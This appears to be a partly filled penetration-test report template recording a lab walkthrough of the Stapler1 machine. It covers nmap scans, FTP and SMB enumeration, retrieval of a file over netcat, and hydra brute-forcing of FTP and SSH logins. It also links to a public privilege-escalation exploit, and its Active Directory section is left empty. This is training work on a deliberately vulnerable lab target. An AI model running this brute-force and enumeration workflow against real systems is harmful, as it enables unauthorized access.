- **Independent Challenges**
- **1 Target #1 – 192.168.11.19**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

- **1.1 Service Enumeration**

**Host Discovery**

└─# nmap -sn -T4 192.168.11.10-20

![[Stapler1 image.png]]

192.168.11.19

└─# nmap -Pn -p- --min-rate=10000 192.168.11.19

![[Stapler1 image 1.png]]

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
| 192.168.11.19 | **TCP**: 20,21,22,53,80,139,666,3306,12380 |

└─# nmap -Pn -sV -sC -p20,21,22,53,80,123,137,138,139,666,3306 --min-rate=10000 192.168.11.19 -o nmap-openport-sv-sc.txt

![[Stapler1 image 2.png]]

![[Stapler1 image 3.png]]

![[Stapler1 image 4.png]]

└─# nmap -Pn -sV -sC -p12380 --min-rate=10000 192.168.11.19 -o nmap-openport2-sv-sc.txt

![[Stapler1 image 5.png]]

└─# nmap -Pn -A --min-rate=100000 192.168.11.19 -o nmap-A.txt

Port 21

└─# ftp 192.168.11.19

![[Stapler1 image 6.png]]

Harry, make sure to update the banner when you get a chance to show who has access here |

ハリー、ここでアクセスできる人を表示する機会があれば、バナーを更新してください|

User Harry

dir

![[Stapler1 image 7.png]]

get note

![[Stapler1 image 8.png]]

└─# cat note

Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

![[Stapler1 image 9.png]]

Ellyさん、ペイロード情報を更新してください。完了したら、FTPアカウントに残してください、ジョン。

User Elly and John

Port 53

└─# dig any  @192.168.11.19

Port 445

└─# enum4linux 192.168.11.19 -o enum4linux

![[Stapler1 image 10.png]]

![[Stapler1 image 11.png]]

└─# vi users.txt

![[Stapler1 image 12.png]]

└─# awk '{print $3}' users.txt| sed 's/User\\//g'  > username.txt

![[Stapler1 image 13.png]]

└─# smbclient //192.168.11.19/kathy

![[Stapler1 image 14.png]]

![[Stapler1 image 15.png]]

![[Stapler1 image 16.png]]

└─# cat todo-list.txt

I'm making sure to backup anything important for Initech, Kathy

私はInitech、キャシーのために重要なものはすべてバックアップするようにしています

![[Stapler1 image 17.png]]

└─# cat vsftpd.conf

![[Stapler1 image 18.png]]

└─# tar -xzvf wordpress-4.tar.gz

![[Stapler1 image 19.png]]

└─# cd wordpress                                                                                                                                                                                                                                       └─# ls

index.php    readme.html      wp-admin            wp-comments-post.php  wp-content   wp-includes        wp-load.php   wp-mail.php      wp-signup.php     xmlrpc.php

license.txt  wp-activate.php  wp-blog-header.php  wp-config-sample.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php

![[Stapler1 image 20.png]]

└─# smbclient //192.168.11.19/tmp

![[Stapler1 image 21.png]]

**Port 666**

└─# nc 192.168.11.19 666 > output

![[Stapler1 image 22.png]]

└─# file output

output: Zip archive data, at least v2.0 to extract, compression method=deflate

![[Stapler1 image 23.png]]

└─# mv output output.zip

![[Stapler1 image 24.png]]

└─# unzip output.zip

Archive:  output.zip

inflating: message2.jpg

![[Stapler1 image 25.png]]

message2.jpg

![[Stapler1 image 26.png]]

**Port 80**

└─# feroxbuster -u http://192.168.11.19 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -g

![[Stapler1 image 27.png]]

└─# feroxbuster -u http://192.168.11.19 -w /usr/share/dirb/wordlists/common.txt -g

![[Stapler1 image 28.png]]

└─# cat ../../Untitled.profile

\# ~/.profile: executed by the command interpreter for login shells.

\# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login

\# exists.

\# see /usr/share/doc/bash/examples/startup-files for examples.

\# the files are located in the bash-doc package.

\# the default umask is set in /etc/profile; for setting the umask

\# for ssh logins, install and configure the libpam-umask package.

#umask 022

\# if running bash

if \[ -n "$BASH_VERSION" \]; then

\# include .bashrc if it exists

if \[ -f "$HOME/.bashrc" \]; then

. "$HOME/.bashrc"

fi

fi

\# set PATH so it includes user's private bin if it exists

if \[ -d "$HOME/bin" \] ; then

PATH="$HOME/bin:$PATH"

fi

└─# cat ../../Untitled.bashrc

\# ~/.bashrc: executed by bash(1) for non-login shells.

\# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)

\# for examples

\# If not running interactively, don't do anything

case $- in

*i*) ;;

*) return;;

esac

\# don't put duplicate lines or lines starting with space in the history.

\# See bash(1) for more options

HISTCONTROL=ignoreboth

\# append to the history file, don't overwrite it

shopt -s histappend

\# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)

HISTSIZE=1000

HISTFILESIZE=2000

\# check the window size after each command and, if necessary,

\# update the values of LINES and COLUMNS.

shopt -s checkwinsize

\# If set, the pattern "**" used in a pathname expansion context will

\# match all files and zero or more directories and subdirectories.

#shopt -s globstar

\# make less more friendly for non-text input files, see lesspipe(1)

\[ -x /usr/bin/lesspipe \] && eval "$(SHELL=/bin/sh lesspipe)"

\# set variable identifying the chroot you work in (used in the prompt below)

if \[ -z "${debian_chroot:-}" \] && \[ -r /etc/debian_chroot \]; then

debian_chroot=$(cat /etc/debian_chroot)

fi

\# set a fancy prompt (non-color, unless we know we "want" color)

case "$TERM" in

xterm-color|*-256color) color_prompt=yes;;

esac

\# uncomment for a colored prompt, if the terminal has the capability; turned

\# off by default to not distract the user: the focus in a terminal window

\# should be on the output of commands, not on the prompt

#force_color_prompt=yes

if \[ -n "$force_color_prompt" \]; then

if \[ -x /usr/bin/tput \] && tput setaf 1 >&/dev/null; then

\# We have color support; assume it's compliant with Ecma-48

\# (ISO/IEC-6429). (Lack of such support is extremely rare, and such

\# a case would tend to support setf rather than setaf.)

color_prompt=yes

else

color_prompt=

fi

fi

if \[ "$color_prompt" = yes \]; then

PS1='${debian_chroot:+($debian_chroot)}\\[\033\[01;32m\\]\u@\h\\[\033\[00m\\]:\\[\033\[01;34m\\]\w\\[\033\[00m\\]\$ '

else

PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

fi

unset color_prompt force_color_prompt

\# If this is an xterm set the title to user@host:dir

case "$TERM" in

xterm*|rxvt*)

PS1="\\[\e\]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\\]$PS1"

;;

*)

;;

esac

\# enable color support of ls and also add handy aliases

if \[ -x /usr/bin/dircolors \]; then

test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"

alias ls='ls --color=auto'

#alias dir='dir --color=auto'

#alias vdir='vdir --color=auto'

alias grep='grep --color=auto'

alias fgrep='fgrep --color=auto'

alias egrep='egrep --color=auto'

fi

\# colored GCC warnings and errors

#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

\# some more ls aliases

alias ll='ls -alF'

alias la='ls -A'

alias l='ls -CF'

\# Add an "alert" alias for long running commands.  Use like so:

\#   sleep 10; alert

alias alert='notify-send --urgency=low -i "$(\[ $? = 0 \] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*\[0-9\]\+\s*//;s/\[;&|\]\s*alert$//'\'')"'

\# Alias definitions.

\# You may want to put all your additions into a separate file like

\# ~/.bash_aliases, instead of adding them here directly.

\# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if \[ -f ~/.bash_aliases \]; then

. ~/.bash_aliases

fi

\# enable programmable completion features (you don't need to enable

\# this, if it's already enabled in /etc/bash.bashrc and /etc/profile

\# sources /etc/bash.bashrc).

if ! shopt -oq posix; then

if \[ -f /usr/share/bash-completion/bash_completion \]; then

. /usr/share/bash-completion/bash_completion

elif \[ -f /etc/bash_completion \]; then

. /etc/bash_completion

fi

fi

**Port** **12380**

└─# feroxbuster -u http://192.168.11.19:12380 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -g

**Browser Access**

![[Stapler1 image 29.png]]

**View Page Source**

![[Stapler1 image 30.png]]

**Zoe**

└─# nikto -h http://192.168.11.19:12380

**1.2** **Initial Access –**

└─# hydra -L username.txt -e nsr ftp://192.168.11.19

![[Stapler1 image 31.png]]

![[Stapler1 image 32.png]]

![[Stapler1 image 33.png]]

![[Stapler1 image 34.png]]

└─# hydra -L user2.txt -e nsr ssh://192.168.11.19

![[Stapler1 image 35.png]]

└─# ssh SHayslett@192.168.11.19

![[Stapler1 image 36.png]]

**1.3** **Privilege Escalation -**

**cat /etc/os-release**

![[Stapler1 image 37.png]]

https://www.exploit-db.com/exploits/39772

**1.4** **Post Exploitation**

![[Stapler1 image 38.png]]

![[Stapler1 image 39.png]]

tar -xvf exploit.tar

![[Stapler1 image 40.png]]

![[Stapler1 image 41.png]]

**Proof.txt value:**b6b545dc11b7a270f4bad23432190c75162c4a2b

- **Active Directory Set**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP:** |
|  | **TCP:** |
|  | **TCP:** |

- **1  –**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.2 Privilege Escalation –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.3 Post-Exploitation**

**System Proof screenshot:**

- **2  –**
- **2.1 Initial Access –**

**Steps to reproduce the attack:**

- **2.2 Post-Exploitation**

**Local Proof Screenshot:**

- **3 DC –**
- **5.3.1 Initial Access –**

**Steps to reproduce the attack:**

- **3.2 Post-Exploitation**

**System Proof Screenshot:**